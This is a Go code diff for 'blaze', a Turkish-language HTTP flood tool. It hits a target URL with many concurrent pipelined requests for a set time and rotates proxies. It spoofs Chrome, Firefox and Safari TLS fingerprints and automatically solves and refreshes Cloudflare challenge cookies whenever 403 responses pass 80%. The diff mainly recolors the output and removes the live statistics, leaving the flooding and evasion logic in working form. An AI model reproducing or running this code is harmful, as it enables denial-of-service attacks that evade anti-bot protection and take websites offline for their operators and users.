@@ -19,23 +19,19 @@ import (
 	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
 )
 
+// ANSI colors
+const (
+	green = "\033[1;32m"
+	red   = "\033[1;31m"
+	reset = "\033[0m"
+)
+
 func main() {
 	if len(os.Args) < 4 {
 		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--solve]")
 		fmt.Println()
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
-		fmt.Println("ornek:    ./blaze https://hedef.com 60 128 50 GET socks5://127.0.0.1:1080")
 		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET --solve")
-		fmt.Println()
-		fmt.Println("flaglar:")
-		fmt.Println("  --solve    cloudflare challenge coz + auto-refresh (puppeteer-real-browser)")
-		fmt.Println("             ilk kullanim: cd solver && npm install")
-		fmt.Println()
-		fmt.Println("proxy dosya formati (satir satir):")
-		fmt.Println("  ip:port")
-		fmt.Println("  ip:port:user:pass")
-		fmt.Println("  socks5://ip:port")
-		fmt.Println("  http://user:pass@ip:port")
 		os.Exit(1)
 	}
 
@@ -76,7 +72,7 @@ func main() {
 		var err error
 		solvedCookies, solvedUA, err = solveCFChallenge(targetURL)
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "hata: challenge cozulemedi: %v\n", err)
+			fmt.Fprintf(os.Stderr, "%shata: challenge cozulemedi: %v%s\n", red, err, reset)
 			os.Exit(1)
 		}
 	}
@@ -84,7 +80,6 @@ func main() {
 	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve)
 }
 
-// solverResult is the JSON output from solver/index.js
 type solverResult struct {
 	Status    string `json:"status"`
 	URL       string `json:"url"`
@@ -93,17 +88,15 @@ type solverResult struct {
 	Error     string `json:"error"`
 }
 
-// solveCFChallenge runs the Node.js solver to get cf_clearance cookie and user-agent.
 func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
-	fmt.Println("cloudflare challenge cozuluyor...")
+	fmt.Printf("cloudflare challenge cozuluyor...\n")
 
 	solverPath := findSolver()
 	if solverPath == "" {
-		return "", "", fmt.Errorf("solver/index.js bulunamadi. 'cd solver && npm install' calistirin")
+		return "", "", fmt.Errorf("solver/index.js bulunamadi")
 	}
-
 	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
-		return "", "", fmt.Errorf("solver/node_modules bulunamadi. 'cd solver && npm install' calistirin")
+		return "", "", fmt.Errorf("solver/node_modules bulunamadi")
 	}
 
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
@@ -118,25 +111,17 @@ func solveCFChallenge(targetURL string) (cookies string, userAgent string, err e
 
 	var result solverResult
 	if errJSON := json.Unmarshal(output, &result); errJSON != nil {
-		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w\ncikti: %s", errJSON, string(output))
+		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w", errJSON)
 	}
 
 	if result.Status == "error" {
-		return "", "", fmt.Errorf("solver hatasi: %s", result.Error)
+		return "", "", fmt.Errorf("%s", result.Error)
 	}
-
 	if result.Cookies == "" {
-		return "", "", fmt.Errorf("solver cookie dondurmedi (status: %s)", result.Status)
+		return "", "", fmt.Errorf("cookie yok (status: %s)", result.Status)
 	}
 
-	fmt.Printf("challenge cozuldu! status: %s\n", result.Status)
-	if result.UserAgent != "" {
-		fmt.Printf("user-agent: %s\n", result.UserAgent)
-	}
-	if result.Status == "no_clearance" {
-		fmt.Println("uyari: cf_clearance cookie bulunamadi, mevcut cookie'ler kullanilacak")
-	}
-
+	fmt.Printf("%schallenge cozuldu!%s\n", green, reset)
 	return result.Cookies, result.UserAgent, nil
 }
 
@@ -149,27 +134,9 @@ func findSolver() string {
 	return ""
 }
 
-// cookieStore holds the current cookie string, updated atomically during refresh.
-type cookieStore struct {
-	mu      sync.RWMutex
-	cookies string
-}
-
-func (cs *cookieStore) Get() string {
-	cs.mu.RLock()
-	defer cs.mu.RUnlock()
-	return cs.cookies
-}
-
-func (cs *cookieStore) Set(c string) {
-	cs.mu.Lock()
-	cs.cookies = c
-	cs.mu.Unlock()
-}
-
-// clientGroup holds multiple clients of the same browser type.
 type clientGroup struct {
 	name      string
+	tag       string // Ch, FF, SF
 	clients   []*gofire.Client
 	pipelines []*gofire.Pipeline
 	templates []*http.Request
@@ -192,11 +159,28 @@ func (cg *clientGroup) ActiveConnections() int64 {
 	return total
 }
 
-// updateCookies updates the Cookie header on all templates.
 func (cg *clientGroup) updateCookies(newCookies string) {
 	for _, tmpl := range cg.templates {
 		tmpl.Header.Set("Cookie", newCookies)
 	}
+}
+
+// formatTestResult returns the impersonate line for a browser test.
+func formatTestResult(tag string, statusCode int, err error) string {
+	if err != nil {
+		errMsg := err.Error()
+		if strings.Contains(errMsg, "tls handshake") || strings.Contains(errMsg, "handshake") {
+			return fmt.Sprintf("%sImpersonate %s > tls handshake failed%s", red, tag, reset)
+		}
+		if strings.Contains(errMsg, "timeout") || strings.Contains(errMsg, "Timeout") {
+			return fmt.Sprintf("%sImpersonate %s > timeout%s", red, tag, reset)
+		}
+		if strings.Contains(errMsg, "connection refused") {
+			return fmt.Sprintf("%sImpersonate %s > connection refused%s", red, tag, reset)
+		}
+		return fmt.Sprintf("%sImpersonate %s > %s%s", red, tag, errMsg, reset)
+	}
+	return fmt.Sprintf("%sImpersonate %s > %d%s", green, tag, statusCode, reset)
 }
 
 func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool) {
@@ -210,15 +194,12 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		totalTargetClients = 10
 	}
 
-	idlePerHost := 256
-	totalIdle := 1024
-
 	baseOpts := []gofire.Option{
 		gofire.WithTimeout(10 * time.Second),
 		gofire.WithTLSHandshakeTimeout(8 * time.Second),
 		gofire.WithDialTimeout(8 * time.Second),
-		gofire.WithMaxIdleConnsPerHost(idlePerHost),
-		gofire.WithMaxIdleConns(totalIdle),
+		gofire.WithMaxIdleConnsPerHost(256),
+		gofire.WithMaxIdleConns(1024),
 		gofire.WithMaxConnsPerHost(0),
 		gofire.WithDNSCacheTTL(30 * time.Minute),
 		gofire.WithIdleConnTimeout(120 * time.Second),
@@ -239,7 +220,7 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 			var err error
 			proxyRotator, err = gofire.NewProxyRotatorFromFile(proxyArg)
 			if err != nil {
-				fmt.Fprintf(os.Stderr, "hata: proxy dosyasi yuklenemedi: %v\n", err)
+				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
 				os.Exit(1)
 			}
 		} else {
@@ -250,11 +231,11 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 	var parsedCookies []*http.Cookie
 	if solvedCookies != "" {
 		parsedCookies = parseCookieHeader(solvedCookies)
-		fmt.Printf("cookie: %d adet yuklendi\n", len(parsedCookies))
 	}
 
 	type browserSpec struct {
 		name    string
+		tag     string // Ch, FF, SF
 		profile gofire.BrowserProfile
 		clients int
 	}
@@ -263,12 +244,11 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 
 	if solvedCookies != "" {
 		browsers = []browserSpec{
-			{"chrome", gofire.Chrome146, totalTargetClients},
+			{"chrome", "Ch", gofire.Chrome146, totalTargetClients},
 		}
 		if solvedUA != "" {
 			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
 		}
-		fmt.Printf("cf-bypass: tum clientlar chrome (solver UA ile)\n")
 	} else {
 		safariClients := totalTargetClients * 4 / 10
 		chromeClients := totalTargetClients * 3 / 10
@@ -283,9 +263,9 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 			firefoxClients = 1
 		}
 		browsers = []browserSpec{
-			{"firefox", gofire.Firefox148, firefoxClients},
-			{"chrome", gofire.Chrome146, chromeClients},
-			{"safari", gofire.SafariIOS18, safariClients},
+			{"firefox", "FF", gofire.Firefox148, firefoxClients},
+			{"chrome", "Ch", gofire.Chrome146, chromeClients},
+			{"safari", "SF", gofire.SafariIOS18, safariClients},
 		}
 	}
 
@@ -301,13 +281,13 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 	}
 
 	for bi, bs := range browsers {
-		cg := &clientGroup{name: bs.name}
+		cg := &clientGroup{name: bs.name, tag: bs.tag}
 		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))
 
 		for i := 0; i < bs.clients; i++ {
 			c, err := gofire.Emulate(bs.profile, opts...)
 			if err != nil {
-				fmt.Fprintf(os.Stderr, "hata: %s client[%d] olusturulamadi: %v\n", bs.name, i, err)
+				fmt.Fprintf(os.Stderr, "%shata: %s client olusturulamadi: %v%s\n", red, bs.name, err, reset)
 				os.Exit(1)
 			}
 			if proxyRotator != nil {
@@ -318,7 +298,7 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 			}
 			tmpl, err := c.PrepareRequest(method, targetURL)
 			if err != nil {
-				fmt.Fprintf(os.Stderr, "hata: %s template olusturulamadi: %v\n", bs.name, err)
+				fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
 				os.Exit(1)
 			}
 			if solvedCookies != "" {
@@ -338,45 +318,20 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		}
 	}()
 
-	actualWorkers := workersPerClient * totalClients
-	fmt.Printf("hedef: %s | sure: %ds | worker: %d (%d/client) | method: %s\n",
-		targetURL, durSec, actualWorkers, workersPerClient, method)
-	if solvedCookies != "" {
-		fmt.Printf("browser: %d chrome client (cf-bypass mode, toplam %d baglanti)\n",
-			totalClients, totalClients)
-		if solveEnabled {
-			fmt.Println("auto-refresh: aktif (403 orani >%80 olunca cookie yenilenir)")
-		}
-	} else {
-		var bCounts []string
-		for _, bs := range browsers {
-			bCounts = append(bCounts, fmt.Sprintf("%d %s", bs.clients, bs.name))
-		}
-		fmt.Printf("browser: %s (toplam %d baglanti)\n",
-			strings.Join(bCounts, " + "), totalClients)
-	}
-	if proxyRotator != nil {
-		fmt.Printf("proxy: %d adet (rotate)\n", proxyRotator.Count())
-	} else if proxyArg != "" {
-		fmt.Printf("proxy: %s\n", proxyArg)
-	}
-
-	// Test one client per browser
+	// Test one client per browser - clean output
 	for _, cg := range groups {
-		fmt.Printf("test [%s]... ", cg.name)
 		testCtx, testCancel := context.WithTimeout(context.Background(), 15*time.Second)
 		resp, testErr := cg.clients[0].DoWithContext(testCtx, method, targetURL, nil, nil)
 		testCancel()
 		if testErr != nil {
-			fmt.Printf("BASARISIZ: %v\n", testErr)
+			fmt.Println(formatTestResult(cg.tag, 0, testErr))
 		} else {
-			fmt.Printf("OK %d\n", resp.StatusCode())
+			fmt.Println(formatTestResult(cg.tag, resp.StatusCode(), nil))
 			resp.Close()
 		}
 	}
 
-	// Pre-warm
-	fmt.Print("baglanti isitiliyor... ")
+	// Pre-warm silently
 	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
 	for _, cg := range groups {
 		for _, c := range cg.clients {
@@ -385,12 +340,6 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 	}
 	warmCancel()
 
-	var totalConns int64
-	for _, cg := range groups {
-		totalConns += cg.ActiveConnections()
-	}
-	fmt.Printf("%d baglanti\n", totalConns)
-
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
 	defer cancel()
 
@@ -398,28 +347,19 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sigCh
-		fmt.Println("\ndurduruluyor...")
 		cancel()
 	}()
 
 	var (
-		totalSent    atomic.Int64
-		totalSuccess atomic.Int64
-		totalFailed  atomic.Int64
-		statusCodes  sync.Map
-		errMu        sync.Mutex
-		recentErrs   []string
-		errCountMap  sync.Map
+		totalSent   atomic.Int64
+		totalFailed atomic.Int64
+		errMu       sync.Mutex
+		recentErrs  []string
+		errCountMap sync.Map
+		recent403   atomic.Int64
+		recentTotal atomic.Int64
+		refreshing  atomic.Bool
 	)
-
-	// 403 tracking for auto-refresh
-	var recent403 atomic.Int64
-	var recentTotal atomic.Int64
-	// refreshing flag prevents multiple concurrent refreshes
-	var refreshing atomic.Bool
-
-	startTime := time.Now()
-	fmt.Printf("basliyor... %d worker x %d client\n\n", actualWorkers, totalClients)
 
 	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
 		totalSent.Add(1)
@@ -427,12 +367,15 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 			totalFailed.Add(1)
 
 			errStr := err.Error()
+			if strings.Contains(errStr, "context canceled") {
+				return
+			}
 			if len(errStr) > 200 {
 				errStr = errStr[:200]
 			}
 			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
 				errMu.Lock()
-				if len(recentErrs) < 5 {
+				if len(recentErrs) < 10 {
 					recentErrs = append(recentErrs, errStr)
 				}
 				errMu.Unlock()
@@ -440,18 +383,10 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 			if val, ok := errCountMap.Load(errStr); ok {
 				val.(*atomic.Int64).Add(1)
 			}
-		} else {
-			totalSuccess.Add(1)
-			if resp != nil {
-				sc := resp.StatusCode()
-				val, _ := statusCodes.LoadOrStore(sc, &atomic.Int64{})
-				val.(*atomic.Int64).Add(1)
-
-				// Track 403 for auto-refresh
-				recentTotal.Add(1)
-				if sc == 403 {
-					recent403.Add(1)
-				}
+		} else if resp != nil {
+			recentTotal.Add(1)
+			if resp.StatusCode() == 403 {
+				recent403.Add(1)
 			}
 		}
 	}
@@ -475,22 +410,20 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		}
 	}
 
-	feedersPerPipeline := 4
 	for _, cg := range groups {
 		for _, p := range cg.pipelines {
-			for i := 0; i < feedersPerPipeline; i++ {
+			for i := 0; i < 4; i++ {
 				feedWg.Add(1)
 				go feedPipeline(p)
 			}
 		}
 	}
 
-	// Auto-refresh goroutine: checks 403 rate every 5 seconds
+	// Auto-refresh (silent unless refreshing)
 	if solveEnabled {
 		go func() {
 			ticker := time.NewTicker(5 * time.Second)
 			defer ticker.Stop()
-
 			for {
 				select {
 				case <-ctx.Done():
@@ -498,138 +431,52 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 				case <-ticker.C:
 					total := recentTotal.Load()
 					count403 := recent403.Load()
-
-					// Reset counters for next window
 					recentTotal.Store(0)
 					recent403.Store(0)
 
-					// Need at least 50 responses to judge
 					if total < 50 {
 						continue
 					}
-
 					rate := float64(count403) / float64(total)
 					if rate < 0.80 {
 						continue
 					}
-
-					// 403 rate > 80% → cookie expired, refresh
 					if !refreshing.CompareAndSwap(false, true) {
-						continue // another refresh already in progress
-					}
-
-					fmt.Printf("\n[auto-refresh] 403 orani: %.0f%% (%d/%d) - cookie yenileniyor...\n",
-						rate*100, count403, total)
-
-					newCookies, _, errSolve := solveCFChallenge(targetURL)
-					if errSolve != nil {
-						fmt.Printf("[auto-refresh] BASARISIZ: %v\n", errSolve)
-						refreshing.Store(false)
 						continue
 					}
 
-					// Update cookies on all templates (live, no restart needed)
+					newCookies, _, errSolve := solveCFChallenge(targetURL)
+					if errSolve != nil {
+						refreshing.Store(false)
+						continue
+					}
 					for _, cg := range groups {
 						cg.updateCookies(newCookies)
 					}
-
-					fmt.Printf("[auto-refresh] cookie yenilendi! devam ediliyor...\n")
 					refreshing.Store(false)
 				}
 			}
 		}()
 	}
 
-	// Stats printer
-	go func() {
-		ticker := time.NewTicker(1 * time.Second)
-		defer ticker.Stop()
-		var lastSent int64
-		var peakRPS int64
-
-		for {
-			select {
-			case <-ctx.Done():
-				return
-			case <-ticker.C:
-				sent := totalSent.Load()
-				ok := totalSuccess.Load()
-				fail := totalFailed.Load()
-				elapsed := time.Since(startTime).Seconds()
-
-				rps := sent - lastSent
-				lastSent = sent
-				if rps > peakRPS {
-					peakRPS = rps
-				}
-
-				var conns int64
-				for _, cg := range groups {
-					conns += cg.ActiveConnections()
-				}
-
-				fmt.Printf("\rsent:%d ok:%d fail:%d rps:%d peak:%d conn:%d %.0fs   ",
-					sent, ok, fail, rps, peakRPS, conns, elapsed)
-			}
-		}
-	}()
-
+	// Silent - no stats during run
 	feedWg.Wait()
 
-	totalDuration := time.Since(startTime)
-	sent := totalSent.Load()
-	ok := totalSuccess.Load()
-	fail := totalFailed.Load()
-
-	avgRPS := float64(0)
-	if totalDuration.Seconds() > 0 {
-		avgRPS = float64(sent) / totalDuration.Seconds()
-	}
-	successRate := float64(0)
-	if sent > 0 {
-		successRate = float64(ok) / float64(sent) * 100
-	}
-
-	var finalConns int64
-	for _, cg := range groups {
-		finalConns += cg.ActiveConnections()
-	}
-
-	fmt.Printf("\n\n--- sonuclar ---\n")
-	fmt.Printf("gonderilen: %d\n", sent)
-	fmt.Printf("basarili:   %d (%%%.1f)\n", ok, successRate)
-	fmt.Printf("basarisiz:  %d\n", fail)
-	fmt.Printf("sure:       %v\n", totalDuration.Round(time.Millisecond))
-	fmt.Printf("ort. rps:   %.0f req/s\n", avgRPS)
-	fmt.Printf("baglanti:   %d (%d client)\n", finalConns, totalClients)
-
-	hasStatus := false
-	statusCodes.Range(func(key, value interface{}) bool {
-		if !hasStatus {
-			fmt.Println("\nstatus kodlari:")
-			hasStatus = true
-		}
-		fmt.Printf("  %d: %d\n", key.(int), value.(*atomic.Int64).Load())
-		return true
-	})
-
+	// Only show errors on stop
 	errMu.Lock()
 	if len(recentErrs) > 0 {
-		fmt.Println("\nhatalar:")
+		fmt.Println()
 		for _, e := range recentErrs {
 			count := int64(0)
 			if val, ok := errCountMap.Load(e); ok {
 				count = val.(*atomic.Int64).Load()
 			}
-			fmt.Printf("  [%dx] %s\n", count, e)
+			fmt.Printf("%s[%dx] %s%s\n", red, count, e, reset)
 		}
 	}
 	errMu.Unlock()
-
-	fmt.Println()
 }
 
-// parseCookieHeader parses a "name=value; name2=value2" string into []*http.Cookie.
 func parseCookieHeader(raw string) []*http.Cookie {
 	header := http.Header{}
 	header.Add("Cookie", raw)
@@ -644,16 +491,13 @@ func isProxyFile(s string) bool {
 	if _, err := os.Stat(s); err == nil {
 		return true
 	}
-	if strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv") {
-		return true
-	}
-	return false
+	return strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv")
 }
 
 func mustInt(s, name string) int {
 	v, err := strconv.Atoi(s)
 	if err != nil || v <= 0 {
-		fmt.Fprintf(os.Stderr, "hata: gecersiz %s: %s\n", name, s)
+		fmt.Fprintf(os.Stderr, "%shata: gecersiz %s: %s%s\n", red, name, s, reset)
 		os.Exit(1)
 	}
 	return v
